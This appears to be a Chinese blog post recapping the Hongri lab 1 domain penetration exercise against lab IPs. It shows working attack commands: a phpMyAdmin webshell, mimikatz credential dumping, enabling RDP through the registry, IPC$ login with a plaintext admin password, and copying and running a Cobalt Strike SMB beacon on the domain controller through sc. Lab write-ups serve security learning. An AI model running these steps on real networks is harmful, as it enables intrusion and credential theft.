@@ -1,0 +1,774 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://kcide.asia/PicGo/20250521164813069.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="XCDH">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="环境说明：    机器 网卡1 网卡2    web服务器 192.168.111.128 192.168.111.128   域控主机 192.168.52.138 无   域内主机 192.168.52.141 无   环境配好了，注意web主机需要在c盘中开启apache服务 一. 信息收集1.1 端口扫描1234567891011121314151617181920┌──(root?kal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场1复盘">
+<meta property="og:url" content="http://example.com/2025/06/27/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1%E5%A4%8D%E7%9B%98/index.html">
+<meta property="og:site_name" content="XCDH">
+<meta property="og:description" content="环境说明：    机器 网卡1 网卡2    web服务器 192.168.111.128 192.168.111.128   域控主机 192.168.52.138 无   域内主机 192.168.52.141 无   环境配好了，注意web主机需要在c盘中开启apache服务 一. 信息收集1.1 端口扫描1234567891011121314151617181920┌──(root?kal">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-27_12-40-18.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-27_14-26-23.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-27_15-11-00.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-27_15-24-07.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_16-25-43.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_16-28-43.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_16-29-59.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_16-32-11.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_16-40-17.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_16-43-39.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_16-53-28.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_16-55-20.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_17-29-48.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_17-39-20.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_18-02-30.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_18-05-51.png">
+<meta property="og:image" content="http://example.com/img/Snipaste_2025-06-28_19-57-12.png">
+<meta property="article:published_time" content="2025-06-27T04:20:32.000Z">
+<meta property="article:modified_time" content="2025-06-28T11:57:49.329Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="复盘">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/Snipaste_2025-06-27_12-40-18.png">
+  
+  
+  
+  <title>红日靶场1复盘 - XCDH</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>XCDH</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://kcide.asia/PicGo/20250521153237608.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="红日靶场1复盘"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-27 12:20" pubdate>
+          2025年6月27日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          960 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">红日靶场1复盘</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>环境说明：</p>
+<table>
+<thead>
+<tr>
+<th>机器</th>
+<th>网卡1</th>
+<th>网卡2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>web服务器</td>
+<td>192.168.111.128</td>
+<td>192.168.111.128</td>
+</tr>
+<tr>
+<td>域控主机</td>
+<td>192.168.52.138</td>
+<td>无</td>
+</tr>
+<tr>
+<td>域内主机</td>
+<td>192.168.52.141</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<p>环境配好了，注意web主机需要在c盘中开启apache服务</p>
+<h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一. 信息收集"></a>一. 信息收集</h2><h3 id="1-1-端口扫描"><a href="#1-1-端口扫描" class="headerlink" title="1.1 端口扫描"></a>1.1 端口扫描</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root<span class="hljs-operator">?</span>kali)-[~]<br>└─<span class="hljs-comment"># nmap 192.168.111.128</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-symbol">//nmap.org</span> ) at <span class="hljs-number">202</span>5-<span class="hljs-number">0</span>6-<span class="hljs-number">28</span> <span class="hljs-number">01</span>:<span class="hljs-number">19</span> EDT<br>Nmap scan report for <span class="hljs-number">192.168</span>.<span class="hljs-number">111.128</span><br>Host is up (<span class="hljs-number">0.0017</span>s latency).<br>Not <span class="hljs-params">shown:</span> <span class="hljs-number">987</span> filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br><span class="hljs-number">25</span><span class="hljs-symbol">/tcp</span>   open  smtp<br><span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span>   open  http<br><span class="hljs-number">110</span><span class="hljs-symbol">/tcp</span>  open  pop3<br><span class="hljs-number">135</span><span class="hljs-symbol">/tcp</span>  open  msrpc<br><span class="hljs-number">139</span><span class="hljs-symbol">/tcp</span>  open  netbios-ssn<br><span class="hljs-number">445</span><span class="hljs-symbol">/tcp</span>  open  microsoft-ds<br><span class="hljs-number">1025</span><span class="hljs-symbol">/tcp</span> open  NFS-<span class="hljs-keyword">or</span>-IIS<br><span class="hljs-number">1027</span><span class="hljs-symbol">/tcp</span> open  IIS<br><span class="hljs-number">1028</span><span class="hljs-symbol">/tcp</span> open  unknown<br><span class="hljs-number">1029</span><span class="hljs-symbol">/tcp</span> open  ms-lsa<br><span class="hljs-number">1030</span><span class="hljs-symbol">/tcp</span> open  iad1<br><span class="hljs-number">3306</span><span class="hljs-symbol">/tcp</span> open  mysql<br><span class="hljs-number">3389</span><span class="hljs-symbol">/tcp</span> open  ms-wbt-server<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-2-目录扫描"><a href="#1-2-目录扫描" class="headerlink" title="1.2 目录扫描"></a>1.2 目录扫描</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># dirb http://192.168.111.128              </span><br><span class="hljs-operator">-</span>----------------<br>DIRB v2.<span class="hljs-number">22</span>    <br>By The Dark Raver<br><span class="hljs-operator">-</span>----------------<br><span class="hljs-params">START_TIME:</span> Fri Jun <span class="hljs-number">27</span> <span class="hljs-number">00</span>:<span class="hljs-number">36</span>:<span class="hljs-number">04</span> <span class="hljs-number">2025</span><br><span class="hljs-params">URL_BASE:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">111.128</span><span class="hljs-symbol">/</span><br><span class="hljs-params">WORDLIST_FILES:</span> <span class="hljs-symbol">/usr/share/dirb/wordlists/common.txt</span><br><span class="hljs-operator">-</span>---------------<br>GENERATED <span class="hljs-params">WORDS:</span> <span class="hljs-number">4612</span><br><span class="hljs-operator">-</span>--- Scanning <span class="hljs-params">URL:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">111.128</span><span class="hljs-symbol">/</span> <span class="hljs-operator">-</span>---<br><span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/aux</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">212</span>)           <br><span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/com1</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">213</span>)           <br><span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/com2</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">213</span>)           <br><span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/com3</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">213</span>)           <br><span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/con</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">212</span>)           <br><span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/lpt1</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">213</span>)           <br><span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/lpt2</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">213</span>)           <span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/nul</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">212</span>)           <span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/phpinfo.php</span> (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">71459</span>) <span class="hljs-operator">==</span><span class="hljs-operator">&gt;</span> <span class="hljs-params">DIRECTORY:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">111.128</span><span class="hljs-operator">/</span>phpmyadmin<span class="hljs-symbol">/</span>            <span class="hljs-operator">==</span><span class="hljs-operator">&gt;</span> <span class="hljs-params">DIRECTORY:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">111.128</span><span class="hljs-operator">/</span>phpMyAdmin<span class="hljs-symbol">/</span>           <span class="hljs-operator">+</span> http:<span class="hljs-symbol">//192.168.111.128/prn</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">212</span>)     <br></code></pre></td></tr></table></figure>
+
+<h2 id="二-漏洞探测"><a href="#二-漏洞探测" class="headerlink" title="二.  漏洞探测"></a>二.  漏洞探测</h2><p>发现了phpMyAdmin ，弱口令登录成功，通过日志的方式写入shell</p>
+<p><img src="/./img/Snipaste_2025-06-27_12-40-18.png" srcset="/img/loading.gif" lazyload></p>
+<p>集体步骤：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73062138/article/details/147000277?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_73062138/article/details/147000277?spm=1001.2014.3001.5501</a></p>
+<h2 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.  漏洞利用"></a>三.  漏洞利用</h2><p><img src="/./img/Snipaste_2025-06-27_14-26-23.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取杀软名，发现该机器没有杀软</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">phpStudy</span>\<span class="hljs-variable">WWW</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">WMIC</span> <span class="hljs-operator">/</span><span class="hljs-variable">Node</span><span class="hljs-operator">:</span><span class="hljs-variable">localhost</span> <span class="hljs-operator">/</span><span class="hljs-variable">Namespace</span><span class="hljs-operator">:</span>\\<span class="hljs-variable">root</span>\<span class="hljs-variable">SecurityCenter2</span> <span class="hljs-built_in">Path</span> <span class="hljs-variable">AntiVirusProduct</span> <span class="hljs-built_in">Get</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">/</span><span class="hljs-built_in">Format</span><span class="hljs-operator">:</span><span class="hljs-built_in">List</span><br><span class="hljs-variable">No</span> <span class="hljs-variable">Instance</span><span class="hljs-punctuation">(</span><span class="hljs-variable">s</span><span class="hljs-punctuation">)</span> <span class="hljs-variable">Available</span><br></code></pre></td></tr></table></figure>
+
+<p>查看RDP的端口（注意：使用16进制转10进制）：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">reg query <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>YSTEM<span class="hljs-char escape_">\C</span>urrentControlSet<span class="hljs-char escape_">\C</span>ontrol<span class="hljs-char escape_">\T</span>erminal Server<span class="hljs-char escape_">\W</span>inStations<span class="hljs-char escape_">\R</span>DP-Tcp&quot;</span> <span class="hljs-symbol">/v</span> PortNumber<br></code></pre></td></tr></table></figure>
+
+<p>根据刚查看的端口，查找服务是否开启：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat <span class="hljs-punctuation">-</span>ano <span class="hljs-string">| findstr &quot;</span><span class="hljs-number">3389</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>没有开放3389端口，手动开启RDP服务：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">reg add <span class="hljs-string">&quot;HKLM<span class="hljs-char escape_">\S</span>YSTEM<span class="hljs-char escape_">\C</span>urrentControlSet<span class="hljs-char escape_">\c</span>ontrol<span class="hljs-char escape_">\T</span>erminal Server&quot;</span> <span class="hljs-symbol">/v</span> fDenyTSConnections <span class="hljs-symbol">/d</span> <span class="hljs-number">0</span> <span class="hljs-symbol">/t</span> REG_DWORD <span class="hljs-operator">/</span>f<br></code></pre></td></tr></table></figure>
+
+<p>使用mimikatz 进行抓取密码：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-27_15-11-00.png" srcset="/img/loading.gif" lazyload></p>
+<p>连接RDP：</p>
+<p><img src="/./img/Snipaste_2025-06-27_15-24-07.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="四-内网信息收集"><a href="#四-内网信息收集" class="headerlink" title="四. 内网信息收集"></a>四. 内网信息收集</h2><h4 id="4-1-收集当前的登录账号："><a href="#4-1-收集当前的登录账号：" class="headerlink" title="4.1 收集当前的登录账号："></a>4.1 收集当前的登录账号：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span>    hostname：（机器名）<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-28_16-25-43.png" srcset="/img/loading.gif" lazyload></p>
+<p>该账户是域账号</p>
+<h4 id="4-2-查询域的名字"><a href="#4-2-查询域的名字" class="headerlink" title="4.2 查询域的名字"></a>4.2 查询域的名字</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-28_16-28-43.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="4-3-域中有几个用户"><a href="#4-3-域中有几个用户" class="headerlink" title="4.3 域中有几个用户"></a>4.3 域中有几个用户</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-28_16-29-59.png" srcset="/img/loading.gif" lazyload></p>
+<p>域中有5个用户名</p>
+<h4 id="4-4-域中有几个电脑"><a href="#4-4-域中有几个电脑" class="headerlink" title="4.4 域中有几个电脑"></a>4.4 域中有几个电脑</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain </span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-28_16-32-11.png" srcset="/img/loading.gif" lazyload></p>
+<p>有三台电脑。</p>
+<h4 id="4-5-获取主机的IP地址和域控的位置"><a href="#4-5-获取主机的IP地址和域控的位置" class="headerlink" title="4.5 获取主机的IP地址和域控的位置"></a>4.5 获取主机的IP地址和域控的位置</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">nslookup -<span class="hljs-built_in">type</span>=SRV <span class="hljs-variable">_ldap</span>.<span class="hljs-variable">_tcp</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-28_16-40-17.png" srcset="/img/loading.gif" lazyload></p>
+<p>域控的IP地址是： 192.168.52.138</p>
+<p>域控的全名是：owa.god.org （注意：owa是域控的机器名）</p>
+<h4 id="4-6-查询IP地址信息"><a href="#4-6-查询IP地址信息" class="headerlink" title="4.6 查询IP地址信息"></a>4.6 查询IP地址信息</h4><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-28_16-43-39.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现是一个双网卡的机器</p>
+<p>IP地址为：192.168.111.128 和 192.168.52.143</p>
+<h4 id="4-7-查看内网网段机器存活情况"><a href="#4-7-查看内网网段机器存活情况" class="headerlink" title="4.7 查看内网网段机器存活情况"></a>4.7 查看内网网段机器存活情况</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-28_16-53-28.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到了两个IP：</p>
+<p>192.168.52.138   —   域控的IP地址（nslookup -type&#x3D;SRV _ldap._tcp）</p>
+<p>192.168.52.141   —   ROOT-TVI862UBEH.god.org （域内的主机）</p>
+<p>192.168.52.143   —   STU1.god.org（已经控制的机器Web）</p>
+<p>确认主机对应的IP：<br><img src="/./img/Snipaste_2025-06-28_16-55-20.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="五-内网渗透"><a href="#五-内网渗透" class="headerlink" title="五. 内网渗透"></a>五. 内网渗透</h2><h5 id="5-1-使用CS上线主机-注意靶机不能出网，需要使用111网段的木马程序"><a href="#5-1-使用CS上线主机-注意靶机不能出网，需要使用111网段的木马程序" class="headerlink" title="5.1 使用CS上线主机(注意靶机不能出网，需要使用111网段的木马程序)"></a>5.1 使用CS上线主机(注意靶机不能出网，需要使用111网段的木马程序)</h5><p><img src="/./img/Snipaste_2025-06-28_17-29-48.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="六-横向移动"><a href="#六-横向移动" class="headerlink" title="六. 横向移动"></a>六. 横向移动</h2><p>APT（高级持续性威胁）是横向移动带来的最常见的网络攻击类型</p>
+<h4 id="6-1-IPC-横向移动"><a href="#6-1-IPC-横向移动" class="headerlink" title="6.1 IPC$横向移动"></a>6.1 IPC$横向移动</h4><p>IPC可以通过验证用户名和密码获得相应的权限,通常在远程管理计算机和查看计算 机的共享资源时使用，可以传文件，但是不能进行流量的代理</p>
+<p>前提：必须要知道域控的账号密码</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">shell</span>  <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.52.138\ipc$ <span class="hljs-string">&quot;hongrisec@2020&quot;</span> /user:god\administrator<br> <span class="hljs-keyword">shell</span> <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span>   <span class="hljs-comment">//检查IPC$是否建立成功</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-28_17-39-20.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="七-隧道代理"><a href="#七-隧道代理" class="headerlink" title="七. 隧道代理"></a>七. 隧道代理</h2><h4 id="7-1-创建一个SMB隧道"><a href="#7-1-创建一个SMB隧道" class="headerlink" title="7.1 创建一个SMB隧道"></a>7.1 创建一个SMB隧道</h4><p>SMB Beacon:</p>
+<p>SMB Beacon 使用命名管道通过父级Beacon进行通信，当两个Beacon连接后，子Beacon从父Beacon获取任务并发送。</p>
+<p><img src="/./img/Snipaste_2025-06-28_18-02-30.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="7-2-上传smb-exe-到服务器上"><a href="#7-2-上传smb-exe-到服务器上" class="headerlink" title="7.2 上传smb.exe 到服务器上"></a>7.2 上传smb.exe 到服务器上</h4><p><img src="/./img/Snipaste_2025-06-28_18-05-51.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="7-3-从web机器上复制到域控上-IPC远程复制文件"><a href="#7-3-从web机器上复制到域控上-IPC远程复制文件" class="headerlink" title="7.3 从web机器上复制到域控上(IPC远程复制文件)"></a>7.3 从web机器上复制到域控上(IPC远程复制文件)</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> 文件 \\IP地址\C$<br><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> smb.<span class="hljs-keyword">exe</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">52.138</span>\C$<br></code></pre></td></tr></table></figure>
+
+<h4 id="7-4-使用服务运行smb木马程序"><a href="#7-4-使用服务运行smb木马程序" class="headerlink" title="7.4 使用服务运行smb木马程序"></a>7.4 使用服务运行smb木马程序</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">shell</span> <span class="hljs-keyword">sc</span> \\owa.god.org create <span class="hljs-keyword">test</span> binpath= <span class="hljs-string">&quot;cmd.exe /c c:\smb.exe&quot;</span>            <span class="hljs-comment">//test服务</span><br></code></pre></td></tr></table></figure>
+
